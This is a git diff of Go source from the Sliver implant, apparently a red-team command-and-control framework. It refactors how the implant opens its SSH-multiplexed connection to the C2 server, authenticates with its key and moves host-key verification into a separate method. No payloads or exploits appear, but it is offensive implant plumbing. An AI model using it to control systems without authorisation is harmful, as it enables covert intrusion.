@@ -23,13 +23,10 @@ import (
 	"log"
 	// {{end}}
 
-	"crypto/x509"
-	"encoding/pem"
 	"errors"
-	"fmt"
 	"io"
 	"net"
-	"strings"
+	"sync"
 	"time"
 
 	"github.com/golang/protobuf/proto"
@@ -39,11 +36,60 @@ import (
 	"github.com/bishopfox/sliver/sliver/constants"
 )
 
-// SetupClient - The Comm prepares SSH code and security details for a client connection.
-func (comm *Comm) SetupClient(caCert []byte, key []byte, name string) (err error) {
+// InitClient - Sets up and start a SSH connection (multiplexer) around a logical connection/stream, or a Session RPC.
+func InitClient(conn net.Conn, isTunnel bool, key []byte) (ss io.ReadWriteCloser, err error) {
+	// Return if we don't have what we need.
+	if conn == nil {
+		return nil, errors.New("net.Conn is nil, cannot init Comm")
+	}
 
-	// The user is the implant. This is important: checked against the implant's certificates.
-	comm.clientConfig.User = name
+	// New SSH multiplexer Comm
+	comm := &Comm{mutex: &sync.RWMutex{}}
+
+	// Pepare the SSH conn/security, and set keepalive policies/handlers.
+	err = comm.setupAuthClient(key, constants.SliverName)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("failed to setup SSH client connection: %s", err.Error())
+		// {{end}}
+		return nil, err
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("Initiating SSH client connection...")
+	// {{end}}
+
+	// We are the client of the C2 server here.
+	comm.sshConn, comm.inbound, comm.requests, err = ssh.NewClientConn(conn, "", comm.clientConfig)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("failed to initiate SSH connection: %s", err.Error())
+		// {{end}}
+		return
+	}
+
+	go comm.serveRequests() // Serve pings & requests with keepalive policies.
+
+	// If the conn is not a tunnel, the session is not
+	// registered yet. Get and return a stream for this.
+	if !isTunnel {
+		ss, err = comm.initSessionClient()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("failed to setup C2 stream: %s", err.Error())
+			// {{end}}
+			return
+		}
+	}
+
+	Comms.Add(comm)                // Everything is up and running, register the mux.
+	go comm.handleServerIncoming() // Handle requests (pings) and incoming connections in the background.
+
+	return
+}
+
+// setupAuthClient - The Comm prepares SSH code and security details for a client connection.
+func (comm *Comm) setupAuthClient(key []byte, name string) (err error) {
 
 	// Private key is used to authenticate to the server/pivot.
 	signer, err := ssh.ParsePrivateKey(key)
@@ -53,95 +99,12 @@ func (comm *Comm) SetupClient(caCert []byte, key []byte, name string) (err error
 		// {{end}}
 		return
 	}
-	comm.clientConfig.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
 
-	// This checks the key presented by the server/pivot.
-	hostKeyCallback := func(hostname string, remote net.Addr, key ssh.PublicKey) error {
-
-		pubKey := strings.TrimSpace(string(ssh.MarshalAuthorizedKey(key))) // Trimmed public key in PEM format
-
-		sliverCACertPool := x509.NewCertPool()
-		ok := sliverCACertPool.AppendCertsFromPEM(caCert)
-		if !ok {
-			return fmt.Errorf("Failed to parse SliverCA certificate")
-		}
-
-		block, _ := pem.Decode([]byte(pubKey))
-		if block == nil {
-			return fmt.Errorf("Failed to parse Certificate PEM")
-		}
-		cert, err := x509.ParseCertificate(block.Bytes)
-		if err != nil {
-			return fmt.Errorf("Failed to parse Certificate: %v", err)
-		}
-
-		opts := x509.VerifyOptions{
-			DNSName: hostname,
-			Roots:   sliverCACertPool,
-		}
-
-		// Verify the provided certificate.
-		if _, err := cert.Verify(opts); err != nil {
-			return fmt.Errorf("Failed to verify certificate: %v", err)
-		}
-
-		return nil
+	comm.clientConfig = &ssh.ClientConfig{
+		User:            name,                                     // The user is the implant name.
+		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)}, // Authenticate as the implant.
+		HostKeyCallback: comm.verifyServer,                        // Checks the key given by the server/pivot.
 	}
-
-	// Register the host key verification callback
-	comm.clientConfig.HostKeyCallback = hostKeyCallback
-
-	return
-}
-
-// InitClient - Sets up and start a SSH connection (multiplexer) around a logical connection/stream, or a Session RPC.
-func (m *Comm) InitClient(conn net.Conn, isTunnel bool, caCert, key []byte) (sessionStream io.ReadWriteCloser, err error) {
-	// {{if .Config.Debug}}
-	log.Printf("Initiating SSH client connection...")
-	// {{end}}
-
-	// Return if we don't have what we need.
-	if conn == nil {
-		return nil, errors.New("net.Conn is nil, cannot init Comm")
-	}
-
-	// Pepare the SSH conn/security, and set keepalive policies/handlers.
-	err = m.SetupClient(caCert, key, constants.SliverName)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("failed to setup SSH client connection: %s", err.Error())
-		// {{end}}
-		return nil, err
-	}
-
-	// We are the client of the C2 server here.
-	m.sshConn, m.inbound, m.requests, err = ssh.NewClientConn(conn, "", m.clientConfig)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("failed to initiate SSH connection: %s", err.Error())
-		// {{end}}
-		return
-	}
-
-	// Serve pings & requests with keepalive policies, the same way for pivots or not.
-	go m.serveRequests()
-
-	// If the conn is not a tunnel, it means the session is not registered yet. Get and return a stream for this.
-	if !isTunnel {
-		sessionStream, err = m.initSessionClient()
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("failed to setup C2 stream: %s", err.Error())
-			// {{end}}
-			return
-		}
-	}
-
-	// Everything is up and running, register the mux.
-	Comms.Add(m)
-
-	// Handle requests (pings) and incoming connections in the background.
-	go m.serveActiveConnection()
 
 	return
 }
